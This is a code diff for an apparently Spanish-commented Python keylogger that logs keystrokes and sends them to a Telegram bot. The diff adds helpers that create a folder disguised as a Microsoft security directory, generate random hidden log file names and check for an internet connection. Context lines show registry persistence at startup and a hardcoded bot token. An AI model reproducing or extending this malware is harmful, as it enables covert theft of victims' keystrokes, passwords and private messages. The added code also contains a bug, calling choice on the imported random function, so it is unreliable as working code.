@@ -10,7 +10,11 @@
 #░╚═══██╗██╔═══╝░░░╚██╔╝░░░░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║░░░░░░
 #██████╔╝██║░░░░░░░░██║░░░░░░░██║░░░███████╗███████╗███████╗╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║░░░░░░
 #╚═════╝░╚═╝░░░░░░░░╚═╝░░░░░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░v1.0░
+import os
+import socket
+import string
 import time                             # Pausar script por segundos predeterminados
+from random import random
 from winreg import OpenKey, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, SetValueEx, HKEY_CURRENT_USER
 
 import telepot                          # Api de Telegram
@@ -45,6 +49,35 @@ class Config:
             self.TOKEN = "1238108150:AAGdB66CsS_5fKpgVnOXvO8w9eSrT2V5n50"  # TOKEN de tu Bot [Obligatorio]
             # Personalize
             self.LEN_TEXT = 2  # 3600  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
+class Functions:
+    def __init__(self):
+        pass
+
+    def CheckFolder_StartUP(self):  # Función especial para el startUp
+        try:  # Intenta crear la dirección
+            os.makedirs(
+                "C:\\Users\\Public\\Security\\Microsoft")  # Carpeta especial de verificación de startup <No cambiar si no sabe lo que es>
+            return True  # Se creó la carpeta
+        except:
+            return False  # La carpeta ya existe
+        pass
+
+    def RandomChar(self, number=50):  # Genera letras aleatorias [Longitud según el argumento]
+        return ''.join(random.choice(string.ascii_letters) for x in range(number))
+
+    def RamdomLogNamePATH(self, number=23):
+        return Config().PATH_HIDDEN_LOG + Functions().RandomChar(number) + ".txt"
+    # Función = Verifica si hay conexión a internet para poder envíar el log
+    def VerifyConnection(self):
+        con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
+        try:                                                            # Intenta conectarse al servidor de Google
+            con.connect(('www.google.com', 80))
+            con.close()
+            print("[Test Internet] => [OK]")
+            return True
+        except:
+            print("[Test Internet] => [NO]")
+            return False
 
 class Util:
     def __init__(self):
@@ -65,9 +98,6 @@ class Util:
                 registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)  # local
                 SetValueEx(registry, Config().NAME_REG, 0, REG_SZ, Config().PATH_KEY)
                 print("[StartUp] USER - EXITOSO")
-class Functions:
-    def __init__(self):
-        pass
 
 
 class Keylogger:
